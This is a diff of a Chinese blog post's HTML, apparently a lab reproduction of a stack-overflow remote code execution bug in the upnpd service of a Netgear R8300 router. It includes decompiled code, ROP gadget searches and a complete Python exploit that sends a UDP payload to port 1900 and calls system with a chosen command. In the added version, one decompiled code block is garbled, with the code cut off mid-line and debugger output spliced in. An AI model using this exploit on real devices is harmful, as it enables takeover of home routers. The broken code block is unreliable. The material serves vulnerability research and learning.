 <p>可以看到upnpd服务已被启动,环境配置完成</p>
-<h4 id="Hook流程的梳理"><a href="#Hook流程的梳理" class="headerlink" title="Hook流程的梳理"></a>Hook流程的梳理</h4><p>首先我们要知道,我们hook的几个函数的原本作用是从硬件中提取一些特定的字段,比如下图中的函数就是为了获取硬件中<code>upnp_duration</code>与<code>upnp_advert_period</code>字段的内容</p>
+<h4 id="Hook流程的梳理"><a href="#Hook流程的梳理" class="headerlink" title="Hook流程的梳理"></a>Hook流程的梳理</h4><p>首先我们要知道,我们hook的几个函数的原本作用是从硬件中提取一些特定的字段,比如下图中的函数就是为了获取硬件中upnp_duration与upnp_advert_period字段的内容</p>
 <p><img src="/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752126406576.png" alt="1752126406576"></p>
-<p>但是我们没有硬件,所以如果使用固件包中的库函数<code>acosNvramConfig_get</code>一定会报错</p>
-<p>所以我们自己写的函数hook掉了原本的<code>acosNvramConfig_get</code>之类的函数.</p>
-<p>而相对的,原本要从硬件中提取字段,变成了从某个文件中提取字段,从我们<code>custom_nvram.c</code>源码中分析可以知道,是从<code>&quot;/tmp/nvram.ini&quot;</code>文件中通过<code>open</code>,<code>fgets</code>等操作将内容提取.</p>
-<p>所以我们要把字段先提前准备在<code>/tmp/nvram.ini</code>这个文件中</p>
+<p>但是我们没有硬件,所以如果使用固件包中的库函数acosNvramConfig_get一定会报错</p>
+<p>所以我们自己写的函数hook掉了原本的acosNvramConfig_get之类的函数.</p>
+<p>而相对的,原本要从硬件中提取字段,变成了从某个文件中提取字段,从我们custom_nvram.c源码中分析可以知道,是从”&#x2F;tmp&#x2F;nvram.ini”文件中通过open,fgets等操作将内容提取.</p>
+<p>所以我们要把字段先提前准备在&#x2F;tmp&#x2F;nvram.ini这个文件中</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NVRAM_FILE      <span class="string">&quot;/tmp/nvram.ini&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_nvram</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">   FILE *fp;</span><br><span class="line">   <span class="type">char</span> line[NVRAM_LINE], *k, *v;</span><br><span class="line"></span><br><span class="line">   fp = fopen(NVRAM_FILE, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(fp == (FILE *) <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Cannot open %s\n&quot;</span>, NVRAM_FILE);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">硬件                    --&gt;     /tmp/nvram.ini</span><br><span class="line">固件acosNvramConfig_func--&gt;     自定义acosNvramConfig_func</span><br></pre></td></tr></table></figure>
@@ -407,58 +409,32 @@
 <h2 id="2-逆向分析"><a href="#2-逆向分析" class="headerlink" title="| 2 | 逆向分析"></a>| 2 | 逆向分析</h2><p>查看程序的保护</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/zer00ne/Desktop/cve_review/stage1/netgear/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/upnpd&#x27;</span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8000)</span><br></pre></td></tr></table></figure>
 
-<p>开启了<code>NX</code>保护,我们就不能用<code>shellcode</code>了,但是好在<code>elf</code>很大,存在丰富的<code>gadget</code>与<code>system</code>函数,可以通过<code>ROP</code>进行<code>RCE</code></p>
+<p>开启了NX保护,我们就不能用shellcode了,但是好在elf很大,存在丰富的gadget与system函数,可以通过ROP进行RCE</p>
 <p>将upnpd放入IDA中分析</p>
 <p><img src="/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752115479640.png" alt="1752115479640"></p>
-<p>找到一处<code>recvfrom</code>,向低地址处回溯套接字信息</p>
-<p>我们可以找到所有对<code>bind</code>函数的交叉引用,逐个分析</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_C7E4</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [sp+14h] [bp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> optval; <span class="comment">// [sp+24h] [bp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">log</span>(<span class="number">2</span>, <span class="string">&quot;%s:%d()\n&quot;</span>, <span class="string">&quot;upnp_sockeInit&quot;</span>, <span class="number">964</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">1900</span> )                             <span class="comment">// ip==1900</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="built_in">log</span>(<span class="number">2</span>, <span class="string">&quot;%s(%d): Can&#x27;t create HTTP socket..\n&quot;</span>, <span class="string">&quot;upnp_sockeInit&quot;</span>, a1);</span><br><span class="line">LABEL_11:</span><br><span class="line">    v5 = v2;</span><br><span class="line">    v2 = <span class="number">-1</span>;</span><br><span class="line">    close(v5);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">log</span>(<span class="number">2</span>, <span class="string">&quot;%s(%d): Can&#x27;t create SSDP %d socket..\n&quot;</span>, <span class="string">&quot;upnp_sockeInit&quot;</span>, <span class="number">969</span>, <span class="number">1900</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_3:</span><br><span class="line">  <span class="keyword">if</span> ( setsockopt(v2, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">log</span>(<span class="number">2</span>, <span class="string">&quot;setsockopt REUSEADDR failed!\n&quot;</span>);</span><br><span class="line">    addr.sa_family = <span class="number">2</span>;</span><br><span class="line">    v3 = (<span class="type">unsigned</span> __int16)a1;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr.sa_data[<span class="number">2</span>], <span class="number">0</span>, <span class="number">0xC</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="type">unsigned</span> __int16)a1;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr.sa_data[<span class="number">2</span>], <span class="number">0</span>, <span class="number">0xC</span>);</span><br><span class="line">    addr.sa_family = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_WORD *)addr.sa_data = ((_WORD)v3 &lt;&lt; <span class="number">8</span>) | (v3 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">5000</span> )</span><br><span class="line">    *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = sub_C734(<span class="string">&quot;br0&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( bind(v2, &amp;addr, <span class="number">0x10u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">log</span>(<span class="number">2</span>, <span class="string">&quot;Can&#x27;t bind socket..\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>找到一处recvfrom,向低地址处回溯套接字信息</p>
+<p>我们可以找到所有对bind函数的交叉引用,逐个分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_C7E4</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [sp+14h] [bp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> optval; <span class="comment">// [sp+24h] [bp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">log</span>(<span class="number">2</span>, <span class="string">&quot;%s:%d()\n&quot;</span>, <span class="string">&quot;upnp_sockeInit&quot;</span>, <span class="number">964</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">1900</span> )                             <span class="comment">// ip==1900</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="built_in">log</span>(<span class="number">2</span>, <span class="string">&quot;%s(%d): Can&#x27;t create HTTP socket..\n&quot;</span>, <span class="string">&quot;upnp_sockeInit&quot;</span>, a1);</span><br><span class="line">LABEL_11:</span><br><span class="line">    v5 = v2;</span><br><span class="line">    v2 = <span class="number">-1</span>;</span><br><span class="line">    close(v5);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">5000</span> )</span><br><span class="line">    *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = sub_C734(<span class="string">&quot;br0&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( bind(v2, &amp;addr, <span class="number">0x10u</span>) </span><br><span class="line">       dest: <span class="number">0x7effd5f4</span> ◂— <span class="number">0x7effd5f4</span></span><br><span class="line">       src: <span class="number">0x7effdc6c</span> ◂— <span class="number">0x7effdc6c</span></span><br></pre></td></tr></table></figure>
 
-<p>可以看到根据传入参数的不同,开启不同的服务(<code>1500</code>与<code>5000</code>)</p>
-<p>我们对<code>sub_C7E4</code>查看交叉引用,可以发现只有一处引用<code>sub_1C450</code></p>
-<p>对<code>sub_1C450</code>交叉引用,可以发现两处引用,分别是</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = sub_1C450(<span class="number">1900</span>);<span class="comment">//我们分析的recvfrom</span></span><br><span class="line">---</span><br><span class="line">dword_C4584 = sub_1C450(<span class="number">5000</span>);</span><br></pre></td></tr></table></figure>
-
-<p>所以我们向端口<code>1900</code>发送数据就会被第一个<code>recvfrom</code>接收</p>
-<p><img src="/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752116148142.png" alt="1752116148142"></p>
-<p><code>recv</code>后的数据立马被传入<code>vuln</code>函数,buf最多可以输入<code>0x1fff</code>的数据</p>
-<p>进入<code>vuln</code>中,我们可以看到一个明显的<code>strcpy</code>栈溢出漏洞,能溢出的长度非常长</p>
-<p><img src="/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752116301959.png" alt="1752116301959"></p>
-<h2 id="3-EXP编写"><a href="#3-EXP编写" class="headerlink" title="| 3 | EXP编写"></a>| 3 | EXP编写</h2><p>要注意<code>strcpy</code>存在<code>\x00</code>截断,而程序中的地址都存在<code>\x00</code>截断,这就造成直接<code>ROP</code>不可行</p>
-<p>我们还必须找到最快的返回路径,这里我选择了通过进入两次<code>strstr</code>判断快速返回</p>
-<p>注意我们在溢出前会提前覆盖<code>content</code>指针,而<code>content</code>会被用于<code>strrig</code>,所以我们必须把<code>content</code>复改为一个有效的地址</p>
-<p>实际调试中我发现把<code>content</code>随便覆盖为一个栈地址就可以(如果<code>alsr</code>程度过大这里可能需要爆破吧)</p>
-<p>我先使用这个脚本测试这几个字符串处理函数的行为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x600</span>+<span class="string">b&#x27;cccc&#x27;</span>+p32(<span class="number">0x7effdc08</span>)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span><span class="comment">#b&quot;NOTIFYYY&quot;+p32(0x1c154)</span></span><br><span class="line">s.connect((<span class="string">&#x27;192.168.52.133&#x27;</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-
-<p>将断点下在第一个<code>strstr</code>上可以看到,这里是从<code>c</code>开始判断的,如果我们想要快速<code>return</code>,就需要在<code>c</code>后填充带有<code>NOTIFY</code>且不带有<code>&quot;M-SEARCH&quot;</code>的<code>payload</code></p>
-<p><img src="/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752116740010.png" alt="1752116740010"></p>
-<p>据此我们可以总结出这些的<code>payload</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">b&quot;NOTIFY&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x600</span>-<span class="number">6</span>)+<span class="string">b&#x27;cccc&#x27;</span>+p32(<span class="number">0x7effdc08</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&quot;NOTIFYYY&quot;</span>+p32(return_addr)</span><br></pre></td></tr></table></figure>
-
-<p>由于<code>\x00</code>截断,我们只能覆盖一下返回地址,就没了</p>
-<p>这里我想到的手法是<code>栈复用</code>:我们注意到在<code>strcpy</code>中<code>src</code>位于<code>dest</code>的高地址处,且二者偏移固定,为</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x25e70    bl     strcpy@plt                  &lt;strcpy@plt&gt;</span><br><span class="line">       dest: 0x7effd5f4 ◂— 0x7effd5f4</span><br><span class="line">       src: 0x7effdc6c ◂— 0x7effdc6c</span><br></pre></td></tr></table></figure>
-
-<p>所以我们或许可以跳转到<code>src</code>中</p>
+<p>所以我们或许可以跳转到src中</p>
 <p><img src="/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752117588371.png" alt="1752117588371"></p>
-<p>我们覆盖返回地址的<code>gadget</code>需要将栈向上抬高<code>0x630+</code>,然后还要控制执行流,可以在<code>ROPgadget</code>正则搜索</p>
+<p>我们覆盖返回地址的gadget需要将栈向上抬高0x630+,然后还要控制执行流,可以在ROPgadget正则搜索</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./upnpd --only &quot;pop|add&quot;</span><br></pre></td></tr></table></figure>
 
-<p>我选择的是<code>0x0001c154 : add sp, sp, #0x800 ; pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</code></p>
-<p>我们根据长度计算好填充的<code>paadding</code>,得到</p>
+<p>我选择的是0x0001c154 : add sp, sp, #0x800 ; pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}</p>
+<p>我们根据长度计算好填充的paadding,得到</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">b&quot;NOTIFY&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x600</span>-<span class="number">6</span>)+<span class="string">b&#x27;cccc&#x27;</span>+p32(<span class="number">0x7effdc08</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&quot;NOTIFYYY&quot;</span>+p32(<span class="number">0x1c154</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x188</span>+p32(<span class="number">0</span>)*<span class="number">8</span>+p32(ret_addr)</span><br></pre></td></tr></table></figure>
 
-<p>此时便不存在<code>\x00</code>截断,可以自由<code>ROP</code></p>
-<p>由于不存在可以直接控制<code>R0</code>的<code>gadget</code>,我便对所有<code>R0</code>相关<code>gadget</code>都搜索了一遍,最终发现了一个符合要求的</p>
+<p>此时便不存在\x00截断,可以自由ROP</p>
+<p>由于不存在可以直接控制R0的gadget,我便对所有R0相关gadget都搜索了一遍,最终发现了一个符合要求的</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --multibr --binary=./upnpd | grep &quot;R0&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0x000B764 mov r0, r4 ; mov r1, sp ; bl <span class="comment">#0xb2ec ; add sp, sp, #0x400 ; pop &#123;r4, r5, r6, pc&#125;</span></span></span><br></pre></td></tr></table></figure>
 
-<p>这个gadget等效于<code>strcpy(R4,SP);ADD SP 0X400;POP &#123;R4-R6,PC&#125;</code></p>
-<p>而<code>R4</code>是非常好控制的,我们就可以把<code>cmd</code>写在栈上,然后复制到<code>bss</code>段,最后跳转到<code>system</code>实现<code>RCE</code></p>
-<p>同时因为<code>add sp,sp,#0x400</code>还需要继续计算<code>padding</code></p>
-<h2 id="4-最终EXP"><a href="#4-最终EXP" class="headerlink" title="| 4 | 最终EXP"></a>| 4 | 最终EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#0x000B764   strcpy(R4,SP);ADD SP 0X400;POP &#123;R4-R6,PC&#125;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload =<span class="string">b&quot;NOTIFY&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x600</span>-<span class="number">6</span>)+<span class="string">b&#x27;cccc&#x27;</span>+p32(<span class="number">0x7effdc08</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&quot;NOTIFYYY&quot;</span>+p32(<span class="number">0x1c154</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x188</span>+p32(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">payload+=p32(<span class="number">0xf5c0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x93AC8</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xb764</span>)+<span class="string">b&quot;ls -al\x00&quot;</span>.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0xAAAC</span>)<span class="comment">#system</span></span><br><span class="line">s.connect((<span class="string">&#x27;192.168.52.133&#x27;</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个gadget等效于strcpy(R4,SP);ADD SP 0X400;POP {R4-R6,PC}</p>
+<p>而R4是非常好控制的,我们就可以把cmd写在栈上,然后复制到bss段,最后跳转到system实现RCE</p>
+<p>同时因为add sp,sp,#0x400还需要继续计算padding</p>
+<h2 id="4-最终EXP"><a href="#4-最终EXP" class="headerlink" title="| 4 | 最终EXP"></a>| 4 | 最终EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#0x000B764   strcpy(R4,SP);ADD SP 0X400;POP &#123;R4-R6,PC&#125;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload =<span class="string">b&quot;NOTIFY&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x600</span>-<span class="number">6</span>)+<span class="string">b&#x27;cccc&#x27;</span>+p32(<span class="number">0x7effdc08</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&quot;NOTIFYYY&quot;</span>+p32(<span class="number">0x1c154</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x188</span>+p32(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">payload+=p32(<span class="number">0xf5c0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x93AC8</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xb764</span>)+<span class="string">b&quot;ls -al\x00&quot;</span>.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0xAAAC</span>)<span class="comment">#system</span></span><br><span class="line">s.connect((<span class="string">&#x27;192.168.52.133&#x27;</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
 
-<p>我们启动upnpd服务,最终执行了<code>ls -al</code>命令,成功<code>RCE</code></p>
+<p>我们启动upnpd服务,最终执行了ls -al命令,成功RCE</p>
 <p><img src="/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752119616213.png" alt="1752119616213"></p>
 
       
@@ -473,8 +449,6 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/iot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">iot漏洞复现</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
-
 
     </footer>
   </div>
@@ -486,14 +460,14 @@
         
           
           
-            <img data-src="/covers/er.jpg" data-sizes="auto" alt="NetCore RCE漏洞" class="lazyload">
+            <img data-src="/covers/er.jpg" data-sizes="auto" alt="CVE-2005-2799 linksys 栈溢出漏洞" class="lazyload">
           
         
-        <a href="/2025/07/10/NetCore%20RCE%E6%BC%8F%E6%B4%9E/"></a>
+        <a href="/2025/07/14/CVE-2005-2799%20linksys%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
           
-            NetCore RCE漏洞
+            CVE-2005-2799 linksys 栈溢出漏洞
           
         </h3>
       </div>
@@ -504,14 +478,14 @@
       
         
         
-          <img data-src="/covers/er.jpg" data-sizes="auto" alt="TP-Link SR20 RCE漏洞" class="lazyload">
+          <img data-src="/covers/erj.jpg" data-sizes="auto" alt="NetCore RCE漏洞" class="lazyload">
         
       
-      <a href="/2025/07/08/TP-Link%20SR20%20RCE%E6%BC%8F%E6%B4%9E/"></a>
+      <a href="/2025/07/10/NetCore%20RCE%E6%BC%8F%E6%B4%9E/"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
         
-          TP-Link SR20 RCE漏洞
+          NetCore RCE漏洞
         
       </h3>
     </div>
@@ -557,10 +531,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        74.8k
+        71.3k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        05:57
+        05:34
       </div>
     
     
@@ -593,7 +567,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
